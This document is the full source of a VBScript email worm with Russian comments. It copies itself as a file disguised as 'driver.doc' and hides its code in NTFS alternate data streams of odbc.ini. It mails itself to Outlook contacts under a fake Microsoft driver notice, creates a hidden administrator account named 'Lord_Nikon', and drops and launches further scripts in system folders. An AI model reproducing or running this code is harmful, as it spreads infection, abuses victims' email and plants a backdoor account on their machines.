Set wshshell = _
CreateObject("WScript.Shell")
Set WshSysEnv = WshShell.Environment _
("Process")
Set fso = CreateObject _
("Scripting.FileSystemObject")
Set File = _
fso.GetFile _
(WScript.ScriptFullName)
dim L_TestNTFS, L_StdFile, L_StdStream, L_EnterTextStream, L_StdContent
File.Copy _
(WshSysEnv("windir") & _
 "\driver.doc                                              .vbs")
L_StdFile = WshSysEnv("SystemRoot")&"\odbc.ini"
L_StdStream1 = "mail"
L_StdContent1 = "sub mail_me" &vbcrlf& _
"'мылим все это дела американцам, чтоб они обкончались со страху)))" &vbcrlf& _
"Dim OutlookObject, _" &vbcrlf& _
"OutMail, _" &vbcrlf& _
"Index" &vbcrlf& _
"Set OutlookObject = CreateObject _" &vbcrlf& _
"("&chr(34)&"Outlook.Application"&chr(34)&")" &vbcrlf& _
"For Index = 1 To 50" &vbcrlf& _
"Set M = _" &vbcrlf& _
"OutlookObject.CreateItem(0)" &vbcrlf& _
"M.to = _" &vbcrlf& _
"OutlookObject.GetNameSpace _" &vbcrlf& _
"("&chr(34)&"MAPI"&chr(34)&").AddressLists(1). _" &vbcrlf& _
"AddressEntries(Index)" &vbcrlf& _
"M.Subject = _" &vbcrlf& _
chr(34)&"New Generation of drivers."&chr(34)&vbcrlf& _
"M.Body = _" &vbcrlf& _
chr(34)&"Microsoft has published new driver for all types Video Cards, compatible with Windows 95/98/NT/2000/XP."&chr(34)&"& _"&vbcrlf&chr(34)&" You can read about it in attachment document. "&chr(34)&"& _"&vbcrlf&chr(34)&"Best wishes,"&chr(34)&"& _"&vbcrlf&chr(34)&"Microsoft."&chr(34) &vbcrlf& _
"M.Attachments.Add _" &vbcrlf& _
"(WshSysEnv("&chr(34)&"windir"&chr(34)&")& "&chr(34)&"\driver.doc                                              .vbs"&chr(34)&")" &vbcrlf& _
"M. _" &vbcrlf& _
"Send" &vbcrlf& _
"next" &vbcrlf& _
"end sub"&vbcrlf
L_StdStream2 = "main"
L_StdContent2 = "On Error Resume Next" &vbcrlf& _
"Dim fso, File"  &vbcrlf& _
"prefix =  _"  &vbcrlf& _
chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\" & chr(34) &vbcrlf& _
"Set wshshell = _" &vbcrlf& _
"CreateObject("&chr(34)&"WScript.Shell"&chr(34)&")" &vbcrlf& _
"Set WshSysEnv = WshShell.Environment _" &vbcrlf& _
"("&chr(34)&"Process"&chr(34)&")" &vbcrlf& _
"'''''''''''''''''''''''''''''''''''''''''''''''''" &vbcrlf& _
"Set fso = CreateObject _" &vbcrlf& _
"("&chr(34)&"Scripting.FileSystemObject"&chr(34)&")" &vbcrlf& _
"Set File = _" &vbcrlf& _
"fso.GetFile _" &vbcrlf& _
"(WScript.ScriptFullName)" &vbcrlf& _
"Set WshNetwork = WScript.CreateObject _" &vbcrlf& _
"("&chr(34)&"WScript.Network"&chr(34)&")"&vbcrlf& _
"'поехали?;)" &vbcrlf& _
"mail_me"&vbcrlf& _
"if WshSysEnv("&chr(34)&"SystemRoot"&chr(34)&")<>"&chr(34)&chr(34)&" then"&vbcrlf& _ 
"OS="&chr(34)&"winnt/2000"&chr(34)&vbcrlf& _
"	CreateUS _"&vbcrlf& _
"WshNetwork.ComputerName , _"&vbcrlf& _
chr(34)&"Lord_Nikon"&chr(34)&", _"&vbcrlf& _
chr(34)&"password"&chr(34)&vbcrlf& _
"	if success=true then"&vbcrlf& _
"		AddUser _"&vbcrlf& _
"WshNetwork.ComputerName, _"&vbcrlf& _
chr(34)&"Administrators"&chr(34)&", _"&vbcrlf& _
chr(34)&"Lord_Nikon"&chr(34)&vbcrlf& _
"if fixed=false then"&vbcrlf& _
"		AddUser _"&vbcrlf& _
"WshNetwork.ComputerName, _"&vbcrlf& _
chr(34)&"Администраторы"&chr(34)&", _"&vbcrlf& _
chr(34)&"Lord_Nikon"&chr(34)&vbcrlf& _
"end if"&vbcrlf& _
"else"&vbcrlf& _
"wshshell.run _"&vbcrlf& _
"("&chr(34)&"net user Lord_Nikon password /add"&chr(34)&")"&vbcrlf& _
"wshshell.run _"&vbcrlf& _
"("&chr(34)&"net localgroup Administratotrs Lord_Nikon /add"&chr(34)&")"&vbcrlf& _
"	end if"&vbcrlf& _
"else "&vbcrlf& _
"OS="&chr(34)&"win9x"&chr(34)&vbcrlf& _
"end if"&vbcrlf

L_StdStream3 = "user"
L_StdContent3 = "sub CreateUS _" &vbcrlf& _
"(ServerName, userName, pass)" &vbcrlf& _
"'если это винтукей, то мы сможем создать пользователя и по идее двинуть его в группу админов" &vbcrlf& _
"'в принципе это можно сделать и через net, но чем ч0рт не шутит" &vbcrlf& _
"     on error resume next" &vbcrlf& _
"     err.clear" &vbcrlf& _
"     set objServer = _" &vbcrlf& _
"GetObject("&chr(34)&"WinNT://"&chr(34)&"& ServerName)" &vbcrlf& _
"     set objGroup = _" &vbcrlf& _
"objServer.Create("&chr(34)&"user"&chr(34)&", userName)" &vbcrlf& _
"     objGroup.Setpassword (pass)" &vbcrlf& _
"	objGroupr.AccountDisabled=false" &vbcrlf& _
"     objGroup.SetInfo" &vbcrlf& _
"     if err <> 0 then " &vbcrlf& _
"         set success=false" &vbcrlf& _
"     Else" &vbcrlf& _
"         set success=true" &vbcrlf& _
"     end if" &vbcrlf& _
" end sub"&vbcrlf

L_StdStream4 = "group"
L_StdContent4 = "sub AddUser _" &vbcrlf& _
"(server, group, user)" &vbcrlf& _
"'собственно сейчас мы двигаем пользователя" &vbcrlf& _
"     on error resume next" &vbcrlf& _
"     err.clear" &vbcrlf& _
"     set objGroup = _" &vbcrlf& _
"GetObject("&chr(34)&"WinNT://"&chr(34)&" & server & "&chr(34)&"/"&chr(34)&" & group)" &vbcrlf& _
"     objGroup.Add _" &vbcrlf& _
chr(34)&"WinNT://"&chr(34)&" & server & "&chr(34)&"/"&chr(34)&" & user" &vbcrlf& _
"     if err > 0 then " &vbcrlf& _
"         	set fixed = false" &vbcrlf& _
"     Else" &vbcrlf& _
"         	set fixed = true" &vbcrlf& _
"end if" &vbcrlf& _
"end sub"&vbcrlf
 
 
if Not IsNTFS() then 
   WScript.Quit
end if
stream L_StdStream1,L_StdContent1
stream L_StdStream2,L_StdContent2
stream L_StdStream3,L_StdContent3
stream L_StdStream4,L_StdContent4
sub stream(potok,data)
dim sFileName
sFileName = L_StdFile

if sFileName = "" then WScript.Quit

dim sStreamName
sStreamName = potok
if sStreamName = "" then WScript.Quit
dim ts
if Not fso.FileExists(sFileName) then 
   set ts = fso.CreateTextFile(sFileName)
   ts.Close
end if 
dim sFileStreamName, sStreamText
sFileStreamName = sFileName & ":" & potok
if Not fso.FileExists(sFileStreamName) then 
   sStreamText = data
else
   set ts = fso.OpenTextFile(sFileStreamName)
   sStreamText = ts.ReadAll()
   ts.Close
end if 
if sStreamText = "" then WScript.Quit
set ts = fso.CreateTextFile(sFileStreamName)
ts.Write data
end sub


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
function IsNTFS()
   dim drv
   
   IsNTFS = False
   set drv = fso.GetDrive(fso.GetDriveName(WScript.ScriptFullName)) 
    if drv.FileSystem = "NTFS" then IsNTFS = True
end function
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
module = "Set wshshell = _" &vbcrlf& _
"CreateObject("&chr(34)&"WScript.Shell"&chr(34)&")" &vbcrlf& _
"Set WshSysEnv = WshShell.Environment _" &vbcrlf& _
"("&chr(34)&"Process"&chr(34)&")" &vbcrlf& _
"Set fso = CreateObject _" &vbcrlf& _
"("&chr(34)&"Scripting.FileSystemObject"&chr(34)&")" &vbcrlf& _
"set bs = fso.CreateTextFile(WshSysEnv("&chr(34)&"SystemRoot"&chr(34)&")&"&chr(34)&"\system32\ras\notepad.vbs"&chr(34)&")" &vbcrlf& _
"   bs.Close" &vbcrlf& _
"set bs=nothing" &vbcrlf& _
"sub r1(pot)" &vbcrlf& _
"set ns = fso.OpenTextFile("&chr(34)&WshSysEnv("SystemRoot")&"\odbc.ini:"&chr(34)&"&pot)" &vbcrlf& _
"   eXtream = ns.ReadAll()" &vbcrlf& _
"   ns.Close" &vbcrlf& _
"set ns=nothing" &vbcrlf& _
"set dll = fso.OpenTextFile(WshSysEnv("&chr(34)&"SystemRoot"&chr(34)&")&"&chr(34)&"\system32\ras\notepad.vbs"&chr(34)&", 8, True, 0)" &vbcrlf& _
"dll.Writeline eXtream" &vbcrlf& _
"dll.Close" &vbcrlf& _
"set dll=nothing" &vbcrlf& _
"end sub" &vbcrlf& _
"r1 "&chr(34)&"main"&chr(34) &vbcrlf& _
"r1 "&chr(34)&"mail"&chr(34) &vbcrlf& _
"r1 "&chr(34)&"user"&chr(34) &vbcrlf& _
"r1 "&chr(34)&"group"&chr(34)&vbcrlf& _
"wscript.sleep 10000"&vbcrlf& _
"wshshell.run(WshSysEnv("&chr(34)&"SystemRoot"&chr(34)&")&"&chr(34)&"\system32\ras\notepad.vbs"&chr(34)&")"&vbcrlf
set mod1 = fso.CreateTextFile(WshSysEnv("SystemRoot")&"\system32\go.vbs")
mod1.Write module
mod1.Close
wscript.sleep 10000
wshshell.run(WshSysEnv("SystemRoot")&"\system32\go.vbs")